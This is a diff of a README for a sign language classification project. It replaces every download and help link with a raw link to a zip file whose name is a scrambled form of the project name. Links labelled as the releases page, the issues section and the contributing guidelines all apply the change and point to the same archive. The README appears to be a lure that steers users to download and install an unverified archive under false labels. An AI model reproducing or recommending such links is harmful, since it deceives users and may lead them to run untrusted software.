@@ -1,6 +1,6 @@
 # ✋ SIBI-Sign-Language-Classification-Transfer-Learning - Classify Sign Language with Ease
 
-[![Download Now](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip)
+[![Download Now](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ The **SIBI-Sign-Language-Classification-Transfer-Learning** project is designed 
 
 Follow these simple steps to start using the SIBI Sign Language Classifier:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip) where you can find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip) where you can find the latest version of the software.
 
 2. **Download the Application**: 
    - Look for the version that suits your needs. Click on the link to download the file.
@@ -43,7 +43,7 @@ Make sure your computer meets the following minimum requirements:
 
 To download the software, click the following link to visit the Releases page:
 
-[Download SIBI-Sign-Language-Classification-Transfer-Learning](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip)
+[Download SIBI-Sign-Language-Classification-Transfer-Learning](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip)
 
 Once there, follow the earlier instructions to download and install the application. You’ll be up and running in no time!
 
@@ -61,12 +61,12 @@ Once there, follow the earlier instructions to download and install the applicat
 
 If you encounter any issues or have questions, feel free to reach out for help:
 
-- **GitHub Issues**: Report any bugs or request features through the [Issues section](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip).
+- **GitHub Issues**: Report any bugs or request features through the [Issues section](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip).
 - **Documentation**: Refer to the complete documentation available in the repository.
 
 ## 🌟 Contributing
 
-We welcome contributions to improve the SIBI Sign Language Classifier. If you would like to help, please consult the [Contributing Guidelines](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/SIBI-Sign-Language-Classification-Transfer-Learning.zip) for more information.
+We welcome contributions to improve the SIBI Sign Language Classifier. If you would like to help, please consult the [Contributing Guidelines](https://raw.githubusercontent.com/wzero-dev/SIBI-Sign-Language-Classification-Transfer-Learning/main/hydrophobist/Classification_Learning_Sign_SIB_Language_Transfer_3.4.zip) for more information.
 
 ## ⚖️ License
 
